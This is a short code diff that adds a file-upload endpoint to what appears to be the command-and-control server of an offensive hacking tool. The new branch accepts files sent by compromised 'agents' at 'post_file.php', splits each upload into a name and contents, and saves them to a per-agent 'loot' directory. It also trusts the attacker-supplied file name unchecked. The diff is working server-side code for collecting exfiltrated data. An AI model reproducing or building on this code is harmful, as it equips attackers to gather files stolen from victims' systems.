@@ -56,6 +56,25 @@ class GetHandler(BaseHTTPRequestHandler):
             with open(loot_path + screenshot_name, 'w') as cc_data_file:
                 cc_data_file.write(screen_data)
 
+        elif uri_posted == "post_file.php":
+            self.send_response(200)
+            self.end_headers()
+
+            # Check to make sure the agent directory exists, and a loot
+            # directory for the agent.  If not, make them
+            if not os.path.isdir(loot_path):
+                os.makedirs(loot_path)
+
+            # Read the length of the screenshot file being uploaded
+            screen_length = self.headers['content-length']
+            screen_data = self.rfile.read(int(screen_length))
+
+            file_name = screen_data.split(".:::-989-:::.")[0]
+            file_data = screen_data.split(".:::-989-:::.")[1]
+
+            with open(loot_path + file_name, 'wb') as cc_data_file:
+                cc_data_file.write(file_data)
+
         # All other Post requests
         else:
 
